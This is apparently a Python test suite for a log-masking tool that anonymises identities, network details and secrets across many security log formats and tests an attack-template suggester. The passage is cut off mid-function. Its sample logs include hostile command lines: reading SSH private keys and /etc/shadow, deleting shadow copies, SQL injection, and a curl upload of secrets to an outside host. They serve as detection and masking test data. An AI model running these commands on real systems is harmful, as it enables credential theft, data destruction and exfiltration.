"""Quick checks for the masking engine. Run: python test_masker.py"""

import os
import tempfile

import masker

# The app-level tests below (analyze/chat) would otherwise write their test
# entities into the REAL entity vault — point it at a throwaway file first.
try:
    from cryptography.fernet import Fernet
    import vault
    vault.configure(os.path.join(tempfile.mkdtemp(prefix="masker_test_"),
                                 "vault.enc"),
                    Fernet.generate_key().decode())
except ImportError:
    pass

ALL = ["identities", "network", "secrets"]


def check(name, cond):
    print(("PASS" if cond else "FAIL") + " - " + name)
    assert cond, name


def test_roundtrip():
    raw = (
        "2026-06-09 user=jsmith logged in from 10.4.2.19 to vpn.acme-corp.com\n"
        "email jane.doe@acme-corp.com token=sk-abc123def456ghi789jkl\n"
        "session 550e8400-e29b-41d4-a716-446655440000 mac 00:1A:2B:3C:4D:5E\n"
    )
    masked, mapping = masker.mask(raw, ALL)

    # Real secrets must be gone from what we send.
    check("username removed", "jsmith" not in masked)
    check("ip removed", "10.4.2.19" not in masked)
    check("domain removed", "acme-corp.com" not in masked)
    check("email removed", "jane.doe@acme-corp.com" not in masked)
    check("apikey removed", "sk-abc123def456ghi789jkl" not in masked)
    check("uuid removed", "550e8400-e29b-41d4-a716-446655440000" not in masked)
    check("mac removed", "00:1A:2B:3C:4D:5E" not in masked)

    # Placeholders present.
    check("has placeholders", "[" in masked and "]" in masked)

    # Un-masking an AI-style response restores values.
    fake_ai = "Suspicious login by [USER_1] from [IP_1] using [APIKEY_1]."
    restored = masker.unmask(fake_ai, mapping)
    check("restore user", "jsmith" in restored)
    check("restore ip", "10.4.2.19" in restored)
    check("restore apikey", "sk-abc123def456ghi789jkl" in restored)


def test_stable_placeholders():
    raw = "10.0.0.1 talked to 10.0.0.1 and 10.0.0.2"
    masked, mapping = masker.mask(raw, ["network"])
    # Same IP -> same placeholder; two distinct IPs -> two entries.
    check("two distinct IPs", len(mapping) == 2)
    ph = [k for k, v in mapping.items() if v == "10.0.0.1"][0]
    check("repeated IP uses one placeholder", masked.count(ph) == 2)


def test_category_toggle():
    raw = "user=bob from 10.0.0.1"
    masked, mapping = masker.mask(raw, ["network"])  # identities OFF
    check("user kept when identities off", "bob" in masked)
    check("ip masked when network on", "10.0.0.1" not in masked)


def test_no_false_positive_filenames():
    raw = "loaded config from app.py and server.log"
    masked, mapping = masker.mask(raw, ["network"])
    check("filenames not masked", "app.py" in masked and "server.log" in masked)


def test_ipv6_vs_timestamp():
    raw = "10:31:02 conn from 2001:db8::8a2e:370:7334 and fe80::1 ok"
    masked, mapping = masker.mask(raw, ["network"])
    check("timestamp not masked as ipv6", "10:31:02" in masked)
    check("compressed ipv6 masked", "2001:db8::8a2e:370:7334" not in masked)
    check("link-local ipv6 masked", "fe80::1" not in masked)

    full = "addr fe80:0000:0000:0000:0202:b3ff:fe1e:8329 here"
    m2, _ = masker.mask(full, ["network"])
    check("full ipv6 masked", "fe80:0000:0000:0000:0202:b3ff:fe1e:8329" not in m2)


def test_bare_hostname_param():
    # The PowerShell case the user reported: -ComputerName SRV-DB-02
    raw = ("powershell.exe -nop -w hidden -c \"Invoke-Command "
           "-ComputerName SRV-DB-02 -ScriptBlock { Get-LocalGroupMember "
           "-Group 'Administrators' }\"")
    masked, mapping = masker.mask(raw, ["network"])
    check("bare computer name masked", "SRV-DB-02" not in masked)
    check("hostname maps back", "SRV-DB-02" in mapping.values())

    raw2 = "hostname=web01 server: dc-01.corp connecting"
    m2, _ = masker.mask(raw2, ["network"])
    check("hostname= masked", "web01" not in m2)


def test_custom_terms():
    raw = "Deploy of project-falcon to SRV-DB-02 by Acme Corp ops team"
    masked, mapping = masker.mask(
        raw, [], custom_terms=["project-falcon", "Acme Corp", "SRV-DB-02"])
    check("custom term 1 masked", "project-falcon" not in masked)
    check("custom term 2 masked", "Acme Corp" not in masked)
    check("custom term 3 masked", "SRV-DB-02" not in masked)
    # case-insensitive match, restores exact matched text
    raw3 = "ACME CORP and acme corp"
    m3, map3 = masker.mask(raw3, [], custom_terms=["Acme Corp"])
    check("custom case-insensitive", "ACME CORP" not in m3 and "acme corp" not in m3)
    restored = masker.unmask(m3, map3)
    check("custom restores original casing", restored == raw3)


def test_windows_event_log():
    raw = (
        "An account was successfully logged on.\n"
        "Subject:\n"
        "\tSecurity ID:\t\tS-1-5-21-3623811015-3361044348-30300820-1013\n"
        "\tAccount Name:\t\tjsmith\n"
        "\tAccount Domain:\t\tACME\n"
        "\tLogon ID:\t\t0x3E7\n"
        "New Logon:\n"
        "\tAccount Name:\t\tWS-FINANCE-07$\n"
        "\tAccount Domain:\t\tACME.LOCAL\n"
        "Network Information:\n"
        "\tWorkstation Name:\tWS-FINANCE-07\n"
        "\tSource Network Address:\t10.20.30.40\n"
        "Subject DN: CN=John Smith,OU=Sales,DC=acme,DC=com via console\n"
        "\tAccount Name:\t\t-\n"
        "\tAccount Domain:\t\tNT AUTHORITY\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("SID masked", "S-1-5-21-3623811015" not in masked)
    check("SID masked as one token",
          "S-1-5-21-3623811015-3361044348-30300820-1013" in mapping.values())
    check("event account name masked", "jsmith" not in masked)
    check("event account domain masked", "\tACME\n" not in masked)
    check("computer account masked", "WS-FINANCE-07$" not in masked)
    check("workstation masked", "WS-FINANCE-07\n" not in masked)
    check("source address masked", "10.20.30.40" not in masked)
    check("AD DN masked", "CN=John Smith" not in masked)
    check("AD DN masked as one token",
          "CN=John Smith,OU=Sales,DC=acme,DC=com" in mapping.values())
    check("text after DN kept", "via console" in masked)
    check("placeholder dash kept", "\tAccount Name:\t\t-" in masked)
    check("NT AUTHORITY kept", "NT AUTHORITY" in masked)
    # field labels survive so the AI still understands the structure
    check("field labels kept", "Account Name:" in masked)


def test_network_device_logs():
    raw = (
        "Jun 10 14:23:01 fw-edge-01 %ASA-6-605005: Login permitted from "
        "10.1.1.5/51122 to inside:10.1.1.1/ssh for user 'netadmin'\n"
        "date=2026-06-10 devname=\"FGT-CUST-01\" srcip=192.168.1.77 "
        "user=\"vpnuser1\" msg=\"SSL tunnel established\"\n"
        "snmp community=Pr1v@teRO host=core-sw-02\n"
        "Contact +49 170 1234567 for escalation\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("syslog hostname masked", "fw-edge-01" not in masked)
    check("quoted cisco user masked", "netadmin" not in masked)
    check("fortigate devname masked", "FGT-CUST-01" not in masked)
    check("fortigate user masked", "vpnuser1" not in masked)
    check("snmp community masked", "Pr1v@teRO" not in masked)
    check("host key masked", "core-sw-02" not in masked)
    check("phone masked", "+49 170 1234567" not in masked)
    check("timestamp kept", "14:23:01" in masked)
    check("ASA code kept", "%ASA-6-605005" in masked)


def test_sysmon_logs():
    raw = (
        "Process Create:\n"
        "RuleName: technique_id=T1059\n"
        "UtcTime: 2026-06-10 14:23:01.123\n"
        "ProcessGuid: {a23eae89-bd56-5903-0000-0010e9d95e00}\n"
        "Image: C:\\Windows\\System32\\cmd.exe\n"
        "CommandLine: cmd.exe /c type C:\\Users\\j.doe\\notes.txt\n"
        "CurrentDirectory: C:\\Users\\j.doe\\\n"
        "User: ACME\\j.doe\n"
        "Hashes: SHA256=6E340B9CFFB37A989CA544E6BB780A2C789"
        "01D3FB33738768511A30617AFA01D\n"
        "ParentImage: C:\\Windows\\explorer.exe\n"
        "ParentUser: NT AUTHORITY\\SYSTEM\n"
        "bash -c 'cat /home/j.doe/.ssh/id_rsa'\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sysmon user masked", "j.doe" not in masked)
    check("sysmon domain user masked", "ACME\\j.doe" in mapping.values())
    # System paths must survive intact — they are what the AI analyses.
    check("system32 path kept", "C:\\Windows\\System32\\cmd.exe" in masked)
    check("explorer path kept", "C:\\Windows\\explorer.exe" in masked)
    check("profile path structure kept", "C:\\Users\\[USER_" in masked)
    check("unix home masked", "/home/j.doe" not in masked)
    check("builtin NT AUTHORITY SYSTEM kept", "NT AUTHORITY\\SYSTEM" in masked)
    check("sysmon hash masked", "6E340B9C" not in masked)
    check("sysmon field labels kept", "CommandLine:" in masked)


def test_sysmon_xml():
    raw = (
        "<Event><System><Computer>WS07.acme.local</Computer></System>"
        "<EventData><Data Name='User'>ACME\\svc_backup</Data>"
        "<Data Name='SourceHostname'>WS07</Data>"
        "<Data Name='SourceIp'>10.1.2.3</Data>"
        "<Data Name='TargetUserName'>j.doe</Data>"
        "<Data Name='TargetDomainName'>ACME</Data>"
        "<Data Name='TargetUserName'>-</Data></EventData></Event>"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("xml computer masked", "WS07.acme.local" not in masked)
    check("xml bare hostname masked", ">WS07<" not in masked)
    check("xml user masked", "svc_backup" not in masked)
    check("xml target user masked", "j.doe" not in masked)
    check("xml domain masked", ">ACME<" not in masked)
    check("xml ip masked", "10.1.2.3" not in masked)
    check("xml dash placeholder kept", ">-</Data>" in masked)
    check("xml structure kept", "<Data Name='TargetUserName'>" in masked)


def test_qradar_logs():
    raw = (
        "LEEF:2.0|IBM|QRadar|2.0|AuthFail|usrName=j.doe\tsrc=10.20.30.40\t"
        "dst=172.16.5.10\tidentHostName=ws07.acme.local\n"
        '{"id": 4821, "description": "Multiple Login Failures", '
        '"offense_source": "j.doe", "assigned_to": "soc1@acme.com"}\n'
        "Event Name: Authentication Failure\n"
        "Log Source: WinCollect @ dc01.acme.local\n"
        "Username: j.doe\n"
        "Source IP: 10.20.30.40\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("leef usrName masked", "j.doe" not in masked)
    check("leef src masked", "10.20.30.40" not in masked)
    check("leef identHostName masked", "ws07.acme.local" not in masked)
    check("offense_source masked as user", '"offense_source": "[USER_' in masked)
    check("offense email masked", "soc1@acme.com" not in masked)
    check("qradar log source host masked", "dc01.acme.local" not in masked)
    check("leef header kept", "LEEF:2.0|IBM|QRadar|2.0|AuthFail" in masked)
    check("event name kept", "Authentication Failure" in masked)
    # The same user must read consistently across LEEF, JSON and event text.
    user_ph = [k for k, v in mapping.items() if v == "j.doe"]
    check("one placeholder for same user", len(user_ph) == 1)
    check("user placeholder used 3x", masked.count(user_ph[0]) == 3)


def test_linux_os_logs():
    raw = (
        "Jun 10 14:23:01 srv-web-01 sshd[1234]: Failed password for "
        "invalid user admin from 203.0.113.5 port 51122 ssh2\n"
        "Jun 10 14:23:05 srv-web-01 sshd[1234]: Accepted publickey for "
        "j.smith from 10.1.2.3 port 51123 ssh2: RSA SHA256:tH9Qx\n"
        "Jun 10 14:24:00 srv-web-01 sudo: j.smith : TTY=pts/0 ; "
        "PWD=/home/j.smith ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
        "Jun 10 14:25:00 srv-web-01 su[2345]: pam_unix(su:session): "
        "session opened for user root by j.smith(uid=1000)\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sshd user masked", "j.smith" not in masked)
    check("sshd invalid user masked", "user admin from" not in masked)
    check("sshd host masked", "srv-web-01" not in masked)
    check("linux root kept", "user root" in masked and "USER=root" in masked)
    check("sudo PWD path structure kept", "PWD=/home/[USER_" in masked)
    check("uid number kept", "uid=1000" in masked)
    check("linux command kept", "COMMAND=/bin/cat /etc/shadow" in masked)


def test_cloud_json_logs():
    raw = (
        '{"operationName":"Sign-in activity","properties":{'
        '"userPrincipalName":"j.smith@acme.com",'
        '"userDisplayName":"John Smith","ipAddress":"203.0.113.5",'
        '"appDisplayName":"Office 365",'
        '"deviceDetail":{"displayName":"WS07"}}}\n'
        '{"AccountName":"j.smith","AccountDomain":"acme",'
        '"DeviceName":"ws07.acme.local","Title":"Suspicious process",'
        '"compromisedEntity":"vm-prod-01","password":"hunter2"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("entra upn masked", "j.smith@acme.com" not in masked)
    check("entra display name masked", "John Smith" not in masked)
    check("entra device display name masked", "WS07" not in masked)
    check("entra app name kept", '"appDisplayName":"Office 365"' in masked)
    check("defender account masked", '"AccountName":"[USER_' in masked)
    check("defender domain masked", '"AccountDomain":"[DOMAIN_' in masked)
    check("defender device masked", "ws07.acme.local" not in masked)
    check("defender compromised entity masked", "vm-prod-01" not in masked)
    check("json password masked", "hunter2" not in masked)
    check("alert title kept", "Suspicious process" in masked)


def test_appliance_logs():
    raw = (
        "1581094030.464317986 MX84_Branch ip_flow_start src=192.168.1.5 "
        "dst=8.8.8.8 protocol=udp sport=5353 dport=53\n"
        "1581094031 AP-Floor2 events type=association "
        "client_mac='58:40:4E:AB:3D:4E' identity='j.smith'\n"
        "<134> 06/10/2026:14:23:01 GMT ns01 0-PPE-0 : default SSLVPN LOGIN "
        ": Context j.smith@203.0.113.5 - User j.smith - Client_ip 203.0.113.5\n"
        "Jun 10 14:23:01 cp-gw-01 fw: accept rule: 42; src: 10.1.2.3; "
        "user: j.smith;\n"
        "Jun 10 14:23:01 pa-fw-01 1,2026/06/10,TRAFFIC,end,10.1.2.3,8.8.8.8,"
        "rule1,acme\\j.smith,,web-browsing\n"
        'device_name="XG310" user_name="j.smith" src_ip=10.1.2.3\n'
        "Jun 10 14:23:01 bigip01.acme.local notice apd[1234]: 01490010:5: "
        "Username 'j.smith'\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("meraki device masked", "MX84_Branch" not in masked)
    check("meraki ap masked", "AP-Floor2" not in masked)
    check("appliance user masked everywhere", "j.smith" not in masked)
    check("paloalto domain user masked", "acme\\j.smith" in mapping.values())
    check("sophos device masked", "XG310" not in masked)
    check("meraki event type kept", "ip_flow_start" in masked)
    check("checkpoint verdict kept", "accept rule: 42" in masked)


def test_vmware_and_proxy_logs():
    raw = (
        "2026-06-10T14:23:01.123Z esx01 Hostd: Event 123 : User "
        "j.smith@10.1.2.3 logged in as VMware vim-java\n"
        "2026-06-10T14:24:01.123Z vc01.acme.local vpxd: "
        "[vim.event.UserLoginSessionEvent] User ACME.LOCAL\\j.smith logged in\n"
        "opened \\\\fs01-prod\\finance\\report.xlsx\n"
        "203.0.113.5 - j.smith [10/Jun/2026:14:23:01 +0200] \"GET /profile "
        "HTTP/1.1\" 200 1234 \"https://app.acme.com/\"\n"
        "2026-06-10T14:25:01Z INFO Starting service\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("esxi bare host masked", "esx01" not in masked)
    check("esxi user masked", "j.smith" not in masked)
    check("vcenter dotted domain user masked",
          "ACME.LOCAL\\j.smith" in mapping.values())
    check("unc server masked", "fs01-prod" not in masked)
    check("unc share path kept", "\\finance\\report.xlsx" in masked)
    check("proxy authuser masked", "[USER_" in masked.split("[10/Jun")[0])
    check("log level not masked as host", "INFO Starting service" in masked)


def test_endpoint_security_logs():
    # Symantec EP (space-separated keys), Trend Micro CEF, McAfee ePO XML.
    raw = (
        "Jun 10 14:23:01 sepm01 SymantecServer: Virus found,IP Address: "
        "10.1.2.3,Computer name: WS-FIN-07,Risk name: EICAR Test String,"
        "C:\\Users\\j.smith\\Downloads\\eicar.com,User name: j.smith,"
        "Domain name: ACME\n"
        "<134>Jun 10 14:23:01 dsm01 CEF:0|Trend Micro|Deep Security|20.0|600|"
        "User Signed In|3|src=10.1.2.3 suser=j.smith target=j.smith\n"
        "<EPOEvent><MachineInfo><MachineName>WS07</MachineName>"
        "<UserName>ACME\\j.smith</UserName></MachineInfo>"
        "<ThreatName>EICAR</ThreatName></EPOEvent>\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sep computer name masked", "WS-FIN-07" not in masked)
    check("sep user name masked", "j.smith" not in masked)
    check("sep domain name masked", "Domain name: [DOMAIN_" in masked)
    check("sep verdict kept", "Virus found" in masked)
    check("sep risk name kept", "EICAR Test String" in masked)
    check("trend target masked as user", "target=[USER_" in masked)
    check("epo machine masked", "<MachineName>[HOST_" in masked)
    check("epo user masked", "ACME\\j.smith" in mapping.values())
    check("epo threat kept", "<ThreatName>EICAR</ThreatName>" in masked)


def test_network_security_logs():
    # SonicWALL, Linux dhcpd, QRadar SIM Audit, Cisco AMP JSON.
    raw = (
        "Jun 10 14:23:01 sw01 id=firewall sn=18B169AB12CD fw=203.0.113.1 "
        'msg="Connection Opened" src=10.1.2.3:51122:X0 usr="j.smith"\n'
        "Jun 10 14:23:01 dhcp01 dhcpd: DHCPACK on 10.1.2.55 to "
        "58:40:4e:ab:3d:4e (WS-FIN-07) via eth0\n"
        "Jun 10 14:23:01 qradar01 [SIM Audit] j.smith@10.1.1.100 (1234) - "
        "User j.smith logged in from 10.1.1.100\n"
        '{"computer":{"hostname":"WS07","user":"j.smith@WS07"}}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("sonicwall serial masked", "18B169AB12CD" not in masked)
    check("sonicwall usr masked", "j.smith" not in masked)
    check("dhcpd hostname masked", "WS-FIN-07" not in masked)
    check("dhcpd interface kept", "via eth0" in masked)
    user_ph = [k for k, v in mapping.items() if v == "j.smith"]
    check("same user one placeholder", len(user_ph) == 1)
    check("sim audit user@ip masked", user_ph[0] + "@[IP_" in masked)
    check("amp user@host one token", "j.smith@WS07" in mapping.values())


def test_azure_firewall_and_fp():
    raw = (
        '{"category":"AzureFirewallApplicationRule","resourceId":'
        '"/SUBSCRIPTIONS/9a8b7c6d-1234-5678-9abc-def012345678/RESOURCEGROUPS/'
        'RG-PROD/PROVIDERS/MICROSOFT.NETWORK/AZUREFIREWALLS/FW-PROD-01",'
        '"properties":{"msg":"HTTPS request from 10.1.2.3:51122 to '
        'app.acme-corp.com:443. Action: Allow"}}\n'
        '{"source":"ACME\\\\j.smith","location":'
        '"C:\\\\Users\\\\j.smith\\\\eicar.com","dhost":"WS07"}\n'
        "server listening on localhost:8080 target=https://api.example.org/\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("azure resource id masked as one token", '"resourceId":"[RESOURCE_1]"' in masked)
    check("azure rg not leaked", "RG-PROD" not in masked)
    check("json-escaped domain user masked", "ACME\\\\j.smith" in mapping.values())
    check("json-escaped profile path masked", "j.smith" not in masked)
    check("json path Users kept", "C:\\\\Users\\\\[USER_" in masked)
    check("localhost port kept", "localhost:8080" in masked)
    check("target=https kept", "target=https://" in masked)


def test_dns_mail_infra_logs():
    # ISC BIND, Solaris sendmail, Barracuda WAF, ExtremeWare, Keeper.
    raw = (
        "10-Jun-2026 14:23:01.123 queries: info: client 203.0.113.5#51122 "
        "(mail.acme-corp.com): query: mail.acme-corp.com IN A +E(0)\n"
        "Jun 10 14:23:01 sol01 sendmail[1234]: q5AEN1xyz: "
        "from=<sender@acme-corp.com>, msgid=<202606@mail.acme-corp.com>\n"
        "Jun 10 14:23:01 xtr01 06/10/2026 <Info:SYST> User j.smith "
        "logged in from 10.1.2.3 (telnet)\n"
        '{"audit_event":"login","username":"k.lee@acme-corp.com",'
        '"remote_address":"203.0.113.7"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("bind query domain masked", "mail.acme-corp.com" not in masked)
    check("bind record type kept", "IN A +E(0)" in masked)
    check("sendmail sender masked", "sender@acme-corp.com" not in masked)
    check("sendmail queue id kept", "q5AEN1xyz" in masked)
    check("extremeware user masked", "j.smith" not in masked)
    check("keeper username masked", "k.lee@acme-corp.com" not in masked)
    check("keeper event kept", '"audit_event":"login"' in masked)


def test_wazuh_logs():
    raw = (
        '{"rule":{"level":10,"description":"Multiple authentication failures",'
        '"id":"5720"},"agent":{"id":"012","name":"web01-prod","ip":"10.1.2.3"},'
        '"manager":{"name":"wazuh-mgr01"},"data":{"srcip":"203.0.113.5",'
        '"srcuser":"jsmith","dstuser":"root"},"full_log":"Jun 10 14:23:01 '
        'web01-prod sshd[1234]: Failed password for jsmith from 203.0.113.5"}\n'
        "Jun 10 14:23:01 wazuh-mgr01 wazuh: Alert 1591094030.12: - syscheck, "
        "2026 Jun 10 14:23:01 (web02-prod) 10.1.2.5->syscheck Integrity "
        "checksum changed for: '/etc/passwd'\n"
        'Jun 10 14:23:02 wazuh-mgr01 wazuh: Agent: "web02-prod" reconnected\n'
        'GET / HTTP/1.1 User-Agent: "Mozilla/5.0 (Macintosh)"\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("wazuh agent name masked", "web01-prod" not in masked)
    check("wazuh manager name masked", "wazuh-mgr01" not in masked)
    check("wazuh srcuser masked", "jsmith" not in masked)
    check("wazuh dstuser root kept", '"dstuser":"root"' in masked)
    check("wazuh rule description kept",
          "Multiple authentication failures" in masked)
    check("wazuh syslog alert agent masked", "web02-prod" not in masked)
    check("wazuh checked file kept", "'/etc/passwd'" in masked)
    check("user-agent header kept", 'User-Agent: "Mozilla/5.0' in masked)
    # agent name in JSON and inside full_log must share one placeholder
    host_ph = [k for k, v in mapping.items() if v == "web01-prod"]
    check("wazuh one placeholder per agent", len(host_ph) == 1)
    check("wazuh full_log host masked too", masked.count(host_ph[0]) == 2)


def test_squid_and_watchguard_logs():
    raw = (
        "1581094030.123    245 10.1.2.3 TCP_MISS/200 4521 GET "
        "http://files.acme-corp.com/report.zip jsmith DIRECT/203.0.113.99 "
        "application/zip\n"
        "1581094031.456     12 10.1.2.4 TCP_DENIED/403 3821 CONNECT "
        "badsite.example.net:443 - HIER_NONE/- text/html\n"
        "<142>Jun 10 14:23:01 FW-HQ-01 80BE052F336C0 (2026-06-10T14:23:01) "
        'firewall: msg_id="3000-0148" Allow 1-Trusted 0-External tcp '
        "10.1.2.3 203.0.113.99 51122 443 (HTTP-proxy-00)\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("squid username masked", "jsmith" not in masked)
    check("squid username labeled user", "jsmith" ==
          [v for k, v in mapping.items() if k.startswith("[USER")][0])
    check("squid cache verdict kept", "TCP_MISS/200" in masked)
    check("squid dash ident kept", " - HIER_NONE/- " in masked)
    check("watchguard serial masked", "80BE052F336C0" not in masked)
    check("watchguard hostname masked", "FW-HQ-01" not in masked)
    check("watchguard msg_id kept", 'msg_id="3000-0148"' in masked)


def test_qradar_offense_csv():
    raw = (
        "id,magnitude,closeUser,offenseSource,description,attacker,target,"
        "userCount,assignedToUser,username,attackerNetwork,attackerIP,"
        "domainName,deviceOrderBy,formattedCreatedTime\n"
        '4821,7,m.brown,j.smith,"Multiple Login Failures for j.smith",'
        "10.20.30.40,172.16.5.10,1,soc.analyst1,j.smith,Net-10-172-192,"
        '203.0.113.5,ACME,WS-FIN-07,"Jun 10, 2026 14:23"\n'
        "4822,3,-,WS-FIN-07,Port scan detected,198.51.100.7,10.0.0.5,0,"
        'soc.analyst1,N/A,Net-Guest,198.51.100.7,ACME,sw-core-01,'
        '"Jun 11, 2026 09:00"\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    for leak in ("j.smith", "m.brown", "soc.analyst1", "Net-10-172-192",
                 "Net-Guest", "WS-FIN-07", "sw-core-01"):
        check(f"csv {leak} masked", leak not in masked)
    check("csv bare domain masked", ",ACME," not in masked)
    check("csv header row kept", raw.split("\n")[0] in masked)
    check("csv counts kept", ",7," in masked and ",1," in masked)
    check("csv dates kept", "Jun 10, 2026 14:23" in masked)
    check("csv placeholder dash kept", ",-," in masked)
    check("csv N/A kept", ",N/A," in masked)
    check("csv free text kept", "Multiple Login Failures for" in masked
          and "Port scan detected" in masked)
    check("csv ip labeled IP", "203.0.113.5" in
          [v for k, v in mapping.items() if k.startswith("[IP")])
    # Same value -> same placeholder across columns AND inside descriptions.
    ph = [k for k, v in mapping.items() if v == "j.smith"]
    check("csv one placeholder per user", len(ph) == 1)
    check("csv description value consistent", masked.count(ph[0]) == 3)
    # A comma-separated log line (Symantec EP) must NOT trigger column masking.
    sep = ("Jun 10 14:23:01 sepm01 SymantecServer: Virus found,IP Address: "
           "10.1.2.3,Computer name: WS-FIN-07,Risk name: EICAR,User name: j.smith\n"
           "Jun 10 14:23:02 sepm01 SymantecServer: Scan complete,IP Address: "
           "10.1.2.4,Computer name: WS-FIN-08,Risk name: none,User name: k.lee\n")
    m2, _ = masker.mask(sep, ALL)
    check("non-csv log untouched by csv pass",
          "Virus found" in m2 and "Scan complete" in m2 and "j.smith" not in m2)


def test_custom_patterns():
    raw = "Closed INC0012345 for customer CUST-99812 at 10:00"
    pats = [
        {"label": "ticket", "regex": r"INC\d{7}"},
        {"label": "CUSTOMER-ID", "regex": r"CUST-\d+"},
        {"label": "broken", "regex": r"(unclosed"},   # must be skipped, not crash
    ]
    masked, mapping = masker.mask(raw, [], custom_patterns=pats)
    check("custom pattern ticket masked", "INC0012345" not in masked)
    check("custom pattern customer masked", "CUST-99812" not in masked)
    check("custom label normalized", "[TICKET_1]" in masked)
    check("custom label chars cleaned", "[CUSTOMERID_1]" in masked)
    restored = masker.unmask(masked, mapping)
    check("custom patterns roundtrip", restored == raw)


def test_custom_patterns_persistence():
    import os
    backup = None
    if os.path.exists(masker.PATTERNS_FILE):
        with open(masker.PATTERNS_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        masker.save_custom_patterns([{"label": "TICKET", "regex": r"INC\d{7}"}])
        loaded = masker.load_custom_patterns()
        check("pattern persisted", loaded == [{"label": "TICKET", "regex": r"INC\d{7}"}])
        masked, _ = masker.mask("see INC0012345", [], custom_patterns=loaded)
        check("persisted pattern applies", "INC0012345" not in masked)
    finally:
        if backup is None:
            os.remove(masker.PATTERNS_FILE)
        else:
            with open(masker.PATTERNS_FILE, "w", encoding="utf-8") as f:
                f.write(backup)


def test_conversation_mapping():
    # Turn 1: a log is masked.
    log = "Jun 10 14:23:01 srv-web-01 sshd[1]: Accepted publickey for jsmith from 10.1.2.3"
    masked1, map1 = masker.mask(log, ALL)
    user_ph = [k for k, v in map1.items() if v == "jsmith"][0]
    ip_ph = [k for k, v in map1.items() if v == "10.1.2.3"][0]

    # Turn 2: a follow-up question repeats values — bare "jsmith" matches no
    # generic pattern, but as a known value it must reuse its placeholder.
    q = "Is jsmith allowed to connect from 10.1.2.3? What about 10.9.9.9?"
    masked2, map2 = masker.mask(q, ALL, base_mapping=map1)
    check("known user re-masked in follow-up", "jsmith" not in masked2)
    check("known user keeps placeholder", user_ph in masked2)
    check("known ip keeps placeholder", ip_ph in masked2)
    check("new ip gets next number", "10.9.9.9" not in masked2)
    new_ip_ph = [k for k, v in map2.items() if v == "10.9.9.9"][0]
    check("numbering continues", new_ip_ph != ip_ph)
    check("mapping is cumulative",
          all(k in map2 for k in map1) and "10.9.9.9" in map2.values())
    # Un-masking an answer that mixes old and new placeholders works.
    restored = masker.unmask(f"{user_ph} connected from {new_ip_ph}", map2)
    check("conversation unmask", restored == "jsmith connected from 10.9.9.9")


def test_custom_term_priority():
    # The longest custom term must win over a substring term.
    masked, mapping = masker.mask("deploy to SRV-DB-02 now", [],
                                  custom_terms=["SRV", "SRV-DB-02"])
    check("longest custom term wins", "SRV-DB-02" in mapping.values())
    check("no partial custom mask", "-DB-02" not in masked)


def test_builtin_overrides():
    import os
    backup = None
    if os.path.exists(masker.OVERRIDES_FILE):
        with open(masker.OVERRIDES_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        pats = masker.get_builtin_patterns()
        check("builtin patterns listed", len(pats) >= 45)
        check("builtin patterns have ids/sources/fields",
              all(p["id"] and p["source"] and p["label"] for p in pats))
        # Override the phone pattern with a custom shape.
        masker.set_builtin_pattern("phone", r"PH-\d{4}")
        m, _ = masker.mask("call PH-1234 or +49 170 1234567", ["identities"])
        check("override regex applies", "PH-1234" not in m)
        check("default regex replaced", "+49 170 1234567" in m)
        check("override flagged modified",
              [p for p in masker.get_builtin_patterns()
               if p["id"] == "phone"][0]["modified"])
        # A broken override must not be storable.
        try:
            masker.set_builtin_pattern("phone", r"(unclosed")
            check("broken override rejected", False)
        except Exception:
            check("broken override rejected", True)
        # Unknown id rejected.
        try:
            masker.set_builtin_pattern("no-such-id", r"x")
            check("unknown id rejected", False)
        except ValueError:
            check("unknown id rejected", True)
        # Reset restores the default behaviour.
        masker.reset_builtin_pattern("phone")
        m2, _ = masker.mask("call +49 170 1234567", ["identities"])
        check("reset restores default", "+49 170 1234567" not in m2)
    finally:
        if backup is None:
            if os.path.exists(masker.OVERRIDES_FILE):
                os.remove(masker.OVERRIDES_FILE)
        else:
            with open(masker.OVERRIDES_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        masker.reload_patterns()


def test_template_library():
    import templates as tpl
    lib = tpl.list_templates()
    check("templates present", len(lib) >= 12)
    # Every template carries a MITRE tactic + technique id.
    check("all templates mapped to MITRE",
          all(t["tactic_id"].startswith("TA") and t["technique_id"].startswith("T")
              for t in lib))
    check("template ids unique", len({t["id"] for t in lib}) == len(lib))
    check("get_template works", tpl.get_template("brute_force")["technique_id"] == "T1110")
    check("unknown template empty", tpl.get_template("nope") == {})


def test_template_suggestion():
    import templates as tpl
    cases = {
        "brute_force": "sshd: Failed password for invalid user admin from 1.2.3.4\n"
                       "Failed password for root from 1.2.3.4\naccount lockout",
        "ransomware_impact": "vssadmin.exe Delete Shadows /all /quiet\n"
                             "report.docx.lockbit\nREADME_decrypt.txt",
        "web_attack": "GET /p?q=1' UNION SELECT username,password FROM users-- 200",
        "lateral_movement": "psexec \\\\WS01\\ADMIN$  Logon Type: 3  4648",
        "dns_tunneling": "named query: aGVsbG8gd29ybGQgdGhpc2lzZXhmaWxkYXRh.evil.example.com TXT",
        "exfiltration": "curl -T secrets.zip ftp://x  sc-bytes 9831204 upload to mega.nz",
    }
    for expected, log in cases.items():
        top = tpl.suggest(log, limit=3)
        check(f"suggest top is {expected}", top and top[0]["id"] == expected)
        check(f"{expected} score in 0..1", 0 < top[0]["score"] <= 1)
    # A benign line should suggest nothing strong.
    check("no suggestion for benign log",
          tpl.suggest("2026-06-11T00:00:00Z INFO service started ok") == [])
    check("empty log -> no suggestion", tpl.suggest("") == [])


def test_template_editing():
    import os
    import templates as tpl
    backup = None
    if os.path.exists(tpl.STORE_FILE):
